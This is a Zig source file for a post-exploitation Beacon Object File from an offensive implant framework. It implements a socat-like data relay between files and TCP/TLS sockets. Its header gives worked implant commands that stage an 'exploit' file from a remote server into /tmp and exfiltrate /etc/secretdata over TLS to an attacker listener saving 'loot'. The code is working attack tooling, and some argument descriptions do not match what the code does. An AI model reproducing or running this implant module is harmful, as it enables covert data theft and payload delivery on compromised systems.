///name: socat
///description: "Concatenate and redirect sockets"
///author: Z-Labs
///tags: ['linux','TA0007', 'T1083', 'z-labs']
///category: "POSTEX-BOF"
///OS: cross-platform
///sources:
///    - 'https://raw.githubusercontent.com/The-Z-Labs/bof-launcher/main/bofs/src/socat.zig'
///examples: |
/// socat <src-address> <sink-address> [int:BUF_LEN str:BUF_MEMORY_ADDRESS]
///
/// <src-address> - an address that acts as data source
/// <sink-address> - an address that acts as data sink
///
/// Currently available address types:
///   OPEN:<filename>
///   CREATE:<filename>
///   TCP:<host:port>
///   TLS:<host:ssl-enabled port>
///
/// Options for TLS address type:
///   cacert BUF_LEN BUF_MEMORY_ADDRESS
///   cert BUF_LEN BUF_MEMORY_ADDRESS
///
/// Example use case 1: out-of-band data fetch from remote server:
///
///   Setting up data server:
///     ncat --ssl -nlvp 8443 --ssl-cert cert.pem --ssl-key key.pem < exploit
///   OR with socat:
///     socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:exploit
///
///   In the implant:
///     z-beac0n> socat --argv 'TLS:remotehost:8443,cacert CREATE:/tmp/exploit file=./cacert.pem'
///   From command line:
///     $ bof exec socat TLS:remotehost:8443 CREATE:/tmp/exploit
///
/// Example use case 2: data exfiltration via TLS channel with z-beac0n:
///
///   Setting up listener with ncat on the server-side:
///     ncat --ssl -nlvp 8443 --ssl-cert cert.pem --ssl-key key.pem > loot
///   OR with socat:
///     socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:loot
///
///   In the implant:
///     z-beac0n> socat --argv 'OPEN:/etc/secretdata TLS:remotehost:8443:cacert file=./cacert.pem'
///   From command line:
///     $ bof exec socat CREATE:/tmp/exploit TLS:remotehost:8443
///arguments:
///- name: src_address
///  desc: "path to a file that will be overwritten"
///  type: string
///  required: true
///- name: sink_address
///  desc: "offset in overwritten file"
///  type: string
///  required: true
///- name: BufLen
///  desc: "length of certificate's buffer"
///  type: integer
///  required: false
///- name: BufMemoryAddress
///  desc: "memory address of a buffer with CA certificate"
///  type: string
///  required: false
///  errors:
///- name: AccessDenied
///  code: 0x1
///  message: ""
///- name: NoArgsProvided
///  code: 0x2
///  message: ""
///- name: BadArgsProvided
///  code: 0x3
///  message: ""
///- name: NotSupportedAddressType
///  code: 0x4
///  message: ""
///- name: NoSuchFile
///  code: 0x5
///  message: ""
///- name: ConnectionError
///  code: 0x7
///  message: ""
///- name: DataTransferError
///  code: 0x8
///  message: ""
///- name: ReadFailedError
///  code: 0x9
///  message: ""
///- name: NoCaCertProvided
///  code: 0xa
///  message: ""
///- name: UnknownError
///  code: 0xb
///  message: ""
const std = @import("std");
const posix = @import("std").posix;
const bofapi = @import("bof_api");
const beacon = bofapi.beacon;
const tls = @import("ianicTls");

comptime {
    @import("bof_api").embedFunctionCode("memcpy");
    @import("bof_api").embedFunctionCode("memmove");
    @import("bof_api").embedFunctionCode("memset");
    @import("bof_api").embedFunctionCode("__stackprobe__");
    @import("bof_api").embedFunctionCode("__divti3");
    @import("bof_api").embedFunctionCode("__ashlti3");
    @import("bof_api").embedFunctionCode("__divdi3");
    @import("bof_api").embedFunctionCode("__udivdi3");
    @import("bof_api").embedFunctionCode("__ashldi3");
    @import("bof_api").embedFunctionCode("__modti3");
    @import("bof_api").embedFunctionCode("__aeabi_uldivmod");
    @import("bof_api").embedFunctionCode("__aeabi_uidivmod");
    @import("bof_api").embedFunctionCode("__aeabi_uidiv");
    @import("bof_api").embedFunctionCode("__aeabi_llsl");
}

// BOF-specific error codes
const BofErrors = enum(u8) {
    AccesDenied = 0x1,
    NoArgsProvided,
    BadArgsProvided,
    NotSupportedAddressType,
    NoSuchFile,
    ConnectionError,
    DataTransferError,
    ReadFailedError,
    NoCaCertProvided,
    UnknownError,
};

const AddressType = enum(u8) {
    OPEN = 0x1,
    CREATE,
    STDIN,
    TCP,
    TLS,
    UNRECOGNIZED,
};

var cacert_bytes: ?[]const u8 = null;

var cacert: bool = false;
//var clientCert: bool = false;

fn addCertsFromMemory(cb: *std.crypto.Certificate.Bundle, alloc: std.mem.Allocator, cert_buf: []const u8) std.crypto.Certificate.Bundle.AddCertsFromFileError!void {

    const size = cert_buf.len;
    const decoded_size_upper_bound = size / 4 * 3;
    const needed_capacity = std.math.cast(u32, decoded_size_upper_bound + size) orelse
        return error.CertificateAuthorityBundleTooBig;
    try cb.bytes.ensureUnusedCapacity(alloc, needed_capacity);
    const end_reserved: u32 = @intCast(cb.bytes.items.len + decoded_size_upper_bound);
    const buffer = cb.bytes.allocatedSlice()[end_reserved..];
    @memcpy(buffer[0..size], cert_buf[0..size]);
    const encoded_bytes = buffer[0..size];

    const begin_marker = "-----BEGIN CERTIFICATE-----";
    const end_marker = "-----END CERTIFICATE-----";

    const base64 = std.base64.standard.decoderWithIgnore(" \t\r\n");

    const now_sec = std.time.timestamp();

    var start_index: usize = 0;
    while (std.mem.indexOfPos(u8, encoded_bytes, start_index, begin_marker)) |begin_marker_start| {
        const cert_start = begin_marker_start + begin_marker.len;
        const cert_end = std.mem.indexOfPos(u8, encoded_bytes, cert_start, end_marker) orelse
            return error.MissingEndCertificateMarker;
        start_index = cert_end + end_marker.len;
        const encoded_cert = std.mem.trim(u8, encoded_bytes[cert_start..cert_end], " \t\r\n");
        const decoded_start: u32 = @intCast(cb.bytes.items.len);
        const dest_buf = cb.bytes.allocatedSlice()[decoded_start..];
        cb.bytes.items.len += try base64.decode(dest_buf, encoded_cert);
        try cb.parseCert(alloc, decoded_start, now_sec);
    }
}

fn checkAddressType(addr_type: []const u8) AddressType {
    if(std.mem.eql(u8, "OPEN", addr_type)) {
        return AddressType.OPEN;
    } else if(std.mem.eql(u8, "CREATE", addr_type)) {
        return AddressType.CREATE;
    } else if(std.mem.eql(u8, "TCP", addr_type)) {
        return AddressType.TCP;
    } else if(std.mem.eql(u8, "TLS", addr_type)) {
        return AddressType.TLS;
    }
    else
        return AddressType.UNRECOGNIZED;
}

fn processTlsOptions(parser: *beacon.datap, sink_addr_iter: *std.mem.SplitIterator(u8, .scalar)) void {
    const sinkTlsOpts = sink_addr_iter.next() orelse return;
    var opt_iter = std.mem.splitScalar(u8, sinkTlsOpts, ',');
    while (opt_iter.next()) |opt| {

        // TLS CA certificate for server's cert verification
        if(std.mem.eql(u8, "cacert", opt)) {
            bofapi.print(.output, "opt {s}", .{opt});
            cacert_bytes = blk: {
                const cacert_len = beacon.dataInt(parser);
                const cacert_ptr: *const [@sizeOf(usize)]u8 = @ptrCast(beacon.dataExtract(parser, null));
                break :blk @as([*]const u8, @ptrFromInt(std.mem.readInt(usize, cacert_ptr, .little)))[0..@intCast(cacert_len)];
            };
        }
        // client TLS certificate (mTLS)
        else if(std.mem.eql(u8, "cert", opt)) {
            bofapi.print(.output, "opt {s}", .{opt});
        }
    } 
}

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    @import("bof_api").init(adata, alen, .{});

    bofapi.print(.output, "A tu? 1", .{});
    if (alen == 0) {
        return @intFromEnum(BofErrors.NoArgsProvided);
    }

    const allocator = std.heap.page_allocator;

    var parser = beacon.datap{};
    beacon.dataParse(&parser, adata, alen);

    var file_sink: ?std.fs.File = null;
    var file_src: ?std.fs.File = null;
    var tcp_src: ?std.net.Stream = null;
    var tcp_sink: ?std.net.Stream = null;

    var r_buffer: [tls.input_buffer_len]u8 = undefined;
    var r_iface: *std.Io.Reader = undefined;

    var w_buffer: [tls.output_buffer_len]u8 = undefined;
    var w_iface: *std.Io.Writer = undefined;

    var tls_buf: [tls.input_buffer_len]u8 = undefined;
    var conn_src: ?tls.Connection = null;
    var conn_sink: ?tls.Connection = null;

    var srcAddrType: AddressType = undefined;
    var src_addr_iter: std.mem.SplitIterator(u8, .scalar) = undefined;

    var sinkAddrType: AddressType = undefined;
    var sink_addr_iter: std.mem.SplitIterator(u8, .scalar) = undefined;

    var opt_len: i32 = 0;
    const src_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);
    const sink_address = std.mem.sliceTo(beacon.dataExtract(&parser, &opt_len).?, 0);

    if(std.mem.eql(u8, "-", std.mem.sliceTo(src_address, 0)))
        srcAddrType = AddressType.STDIN;

    // Checking type of <src-address>: get arg prefix and return its type:
    src_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(src_address, 0), ':');
    const srcPrefix = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
    srcAddrType = checkAddressType(srcPrefix);

    if (srcAddrType == AddressType.TCP or srcAddrType == AddressType.TLS) {

        //srcAddrType = checkAddressType(srcPrefix);
        //if (!(srcAddrType == AddressType.TCP or srcAddrType == AddressType.TLS))
        //    return @intFromEnum(BofErrors.NotSupportedAddressType);

        const host = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
        bofapi.print(.output, "Host: {s}", .{host});
        const port = std.fmt.parseUnsigned(u16, src_addr_iter.next() orelse return 17, 10) catch return 1;

        tcp_src = std.net.tcpConnectToHost(allocator, host, port) catch return @intFromEnum(BofErrors.ConnectionError);

        var reader = tcp_src.?.reader(&r_buffer);
        r_iface = reader.interface();

        if (srcAddrType == AddressType.TLS) { 

            var tls_writer = tcp_src.?.writer(&tls_buf);

            var root_ca: std.crypto.Certificate.Bundle = .{};
            defer root_ca.deinit(allocator);

            // iterate thru TLS options if any
            processTlsOptions(&parser, &src_addr_iter);

            if(cacert_bytes) |cert| {
                addCertsFromMemory(&root_ca, allocator, cert) catch return @intFromEnum(BofErrors.NoCaCertProvided);
            }

            var diagnostic: tls.config.Client.Diagnostic = .{};

            conn_src = tls.client(r_iface, &tls_writer.interface, .{
                .host = host,
                .root_ca = root_ca,
                .diagnostic = &diagnostic,
            }) catch return 98;
        }
    }
    else if (srcAddrType == AddressType.OPEN) {

        const file_path = src_addr_iter.next() orelse return @intFromEnum(BofErrors.NoSuchFile);
        file_src = std.fs.openFileAbsolute(file_path, .{ .mode = .read_only }) catch return @intFromEnum(BofErrors.NoSuchFile);

        var reader = file_src.?.reader(&r_buffer);
        r_iface = &reader.interface;
    }


    // Checking type of <sink-address>: get arg prefix and return its type:
    sink_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(sink_address, 0), ':');
    const sinkPrefix = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
    sinkAddrType = checkAddressType(sinkPrefix);

    if (sinkAddrType == AddressType.CREATE) {

        const file_path = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
        file_sink = std.fs.createFileAbsolute(file_path, .{ .truncate = true }) catch return 1;
        //defer file.close();

        var writer = file_sink.?.writer(&w_buffer);
        w_iface = &writer.interface;
    }
    else if (sinkAddrType == AddressType.OPEN) {

        const file_path = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.NoSuchFile);
        file_sink = std.fs.openFileAbsolute(file_path, .{ .mode = .write_only }) catch return @intFromEnum(BofErrors.NoSuchFile);

        var writer = file_sink.?.writer(&w_buffer);
        w_iface = &writer.interface;
    }
    else if (sinkAddrType == AddressType.TCP or sinkAddrType == AddressType.TLS) {

        const host = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
        bofapi.print(.output, "Host: {s}", .{host});
        const port = std.fmt.parseUnsigned(u16, sink_addr_iter.next() orelse return 17, 10) catch return 1;

        tcp_sink = std.net.tcpConnectToHost(allocator, host, port) catch return @intFromEnum(BofErrors.ConnectionError);

        var writer = tcp_sink.?.writer(&w_buffer);
        w_iface = &writer.interface;

        if (sinkAddrType == AddressType.TLS) {
            var tls_reader = tcp_sink.?.reader(&tls_buf);

            var root_ca: std.crypto.Certificate.Bundle = .{};
            defer root_ca.deinit(allocator);

            // iterate thru TLS options if any
            processTlsOptions(&parser, &sink_addr_iter);

            if(cacert_bytes) |cert| {
                addCertsFromMemory(&root_ca, allocator, cert) catch return @intFromEnum(BofErrors.NoCaCertProvided);
            }

            var diagnostic: tls.config.Client.Diagnostic = .{};

            conn_sink = tls.client(tls_reader.interface(), w_iface, .{
                .host = host,
                .root_ca = root_ca,
                .diagnostic = &diagnostic,
            }) catch return 98;
 
        }
    }

    var n: usize = 0;
    var temp_buf: [tls.output_buffer_len]u8 = undefined;
    while(true) {
        if(srcAddrType == AddressType.TLS) {
            n = conn_src.?.readAll(&temp_buf) catch return 34;
        } else
            n = r_iface.readSliceShort(&temp_buf) catch return 33;

        bofapi.print(.output, "N: {d}\n", .{n});

        if(sinkAddrType == AddressType.TLS) {
            conn_sink.?.writeAll(temp_buf[0..n]) catch return 97;
        } else
            w_iface.writeAll(temp_buf[0..n]) catch return 97;

        if (n < temp_buf.len)
            break;
    }
    w_iface.flush() catch return 97;
 

    std.Thread.sleep(1000000000);
    if(srcAddrType == AddressType.TLS) {
        conn_src.?.close() catch return 11;
        tcp_src.?.close();
    }

    std.Thread.sleep(1000000000);
    if(sinkAddrType == AddressType.TLS) {
        conn_sink.?.close() catch return 11;
        tcp_sink.?.close();
    }

    return 0;
}
